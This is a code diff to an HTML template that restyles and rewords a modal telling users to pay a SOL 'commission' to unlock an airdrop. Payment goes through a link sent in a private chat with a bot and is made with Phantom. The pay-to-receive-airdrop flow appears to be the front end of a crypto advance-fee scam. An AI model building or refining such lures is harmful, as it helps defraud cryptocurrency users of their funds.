@@ -535,22 +535,24 @@
 
         <div class="commission-modal" id="commissionModal">
             <div class="commission-modal-content">
-                <span class="close" onclick="closeCommissionModal()">×</span>
+                <div class="modal-logo">💰</div>
                 <h3>Commission Payment Required</h3>
-                <p>To be eligible for the airdrop, you must pay a small commission fee of {{ commission_amount }}
-                    SOL.</p>
-                <div class="info-box">
+                <p class="modal-subtitle">To unlock the airdrop you need to pay {{ commission_amount }} SOL
+                    commission</p>
+
+                <div class="modal-info-box">
                     <h4>How it works:</h4>
                     <ol>
-                        <li>We will send you a payment link in your private chat with the bot</li>
-                        <li>Click the link — it will open in your browser</li>
-                        <li>Complete the payment in Phantom (extension or mobile app)</li>
-                        <li>Return to the app — payment will be detected automatically</li>
+                        <li>We will send a secure payment link to your private chat with the bot</li>
+                        <li>Click the link — it opens in browser</li>
+                        <li>Pay with Phantom (extension or app)</li>
+                        <li>Return here — status updates automatically</li>
                     </ol>
                 </div>
-                <div class="commission-modal-buttons">
-                    <button class="commission-modal-btn secondary" onclick="closeCommissionModal()">Cancel</button>
-                    <button class="commission-modal-btn primary" onclick="sendPaymentLinkToChat()">
+
+                <div class="modal-buttons">
+                    <button class="modal-btn cancel" onclick="closeCommissionModal()">Cancel</button>
+                    <button class="modal-btn pay" onclick="sendPaymentLinkToChat()">
                         Send Payment Link to Chat
                     </button>
                 </div>
